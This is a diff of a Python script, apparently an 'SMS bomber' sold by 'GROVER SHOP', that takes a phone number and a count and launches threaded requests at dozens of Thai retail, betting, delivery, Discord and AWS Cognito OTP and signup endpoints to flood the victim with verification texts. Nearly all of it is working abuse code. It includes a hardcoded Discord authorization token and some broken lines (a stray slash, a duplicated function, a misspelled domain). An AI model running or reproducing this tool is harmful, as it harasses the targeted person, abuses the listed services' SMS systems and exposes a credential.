@@ -1,5 +1,177 @@
-r=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
+import requests
+import os
+import time
+import threading
+import sys
+from re import search
+from threading import Thread
+from requests import post,Session
+
+
+
+
+
+print("""\033[92m                 
+                ╔══╦═╦═╦╗─╔╦═╦═╗     ╔══╦═╦═╦╗
+                ║╔═╣╬║║║╚╦╝║╦╣╬║     ╚╗╔╣║║║║║
+                ║╚╗║╗╣║╠╗║╔╣╩╣╗╣─     ║║║║║║║╚╗
+                ╚══╩╩╩═╝╚═╝╚═╩╩╝─     ╚╝╚═╩═╩═╝
+                
+                      API 100
+                    BY: GROVER SHOP
+            discord:https://discord.gg/A5ZX9egEwSA
+                
+                """)
+
+
+
+phone = input("\033[95m[+] เบอร์ : \033[0m")
+num = int(input("\033[95m[+] จำนวน : \033[0m"))
+
+
+
+
+
+
+useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
+def teat1():
+    post("https://cognito-idp.ap-southeast-1.amaznonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+    
+def teat2():
+    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
+    print (f"Send number {phone} | กำลังยิง ✓")
+    
+def teat3():
+    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
+  "on": {
+    "value": phone,
+    "country": "66"
+  },
+  "type": "mobile"
+},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 
+
+
+
+def teat4():
+    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+    
+def teat5():
+    post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+def teat6():
+    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+
+def teat7():
+    post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+def teat8():
+    post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+ 
+    
+def teat9():
+    post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+def teat10():
+    post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+def teat11():
+    post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
+        "language": "th"},headers={"accept": "application/json, text/plain, /",
+	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+    
+    
+    
+def teat12():
+	post("https://discord.com/api/v9/users/@me/phone",json={
+  "phone": "+66"+phone,
+  "change_phone_reason": "guild_phone_required"
+},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})
+
+
+
+
+def teat13():
+	post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
 	print (f"Send number {phone} | กำลังยิง  ✓")
+
+
+def teat13():
+	post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
+	print (f"Send number {phone} | กำลังยิง  ✓")
+	
+
+def teat14():
+	post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
+	print (f"Send number {phone} | กำลังยิง  ✓")
+	
+def teat15():
+	print (f"Send number {phone} | กำลังยิง  ✓")
+	post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,
+
+"retrycount":"0"
+
+    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    
+    
+def teat16():
+    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+#def teat17():
+#    session = Session()
+#    searchItem = session.get("https://www.shopat24.com/register/").text
+ #   ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
+ #   session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})
+ #   print (f"Send number {phone} | กำลังยิง  ✓")
+     
+     
+def teat18():
+    session = Session()
+    ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
+    session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+    
+
+def sck():
+    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+    print (f"Send number {phone} | กำลังยิง  ✓")
+    
+    
+def teat19():
+		post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
+		print (f"Send number {phone} | กำลังยิง  ✓")
+    
+    
+def teat20():
+	post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone,
+	})
+	print (f"Send number {phone} | กำลังยิง  ✓")
+
+	
+def teat21():
+	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
+	print (f"Send number {phone} | กำลังยิง  ✓")
+
+    
+def teat22():
+	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
+	print (f"Send number {phone} | กำลังยิง  ✓")
+	
+
 	
 def teat23():
 	 requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
@@ -46,10 +218,7 @@ def teat29():
 def teat30():
 	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
 	
-def teat31():
-	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
-	print (f"Send number {phone} | กำลังยิง  ✓")
-	
+/	
 def teat32():
 	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
 	print (f"Send number {phone} | กำลังยิง  ✓")
@@ -145,7 +314,7 @@ for i in range(num):
 	threading.Thread(target=teat28).start()
 	threading.Thread(target=teat29).start()
 	threading.Thread(target=sck).start()
-	threading.Thread(target=teat31).start()
+	
 	threading.Thread(target=teat32).start()
 	threading.Thread(target=teat33).start()
 	threading.Thread(target=teat34).start()
@@ -159,12 +328,3 @@ for i in range(num):
 	threading.Thread(target=teat42).start()
 	threading.Thread(target=CALL43).start()
 	threading.Thread(target=CALL44).start()
-	
-
-	
-	
-		
-		
-		
-		
-		
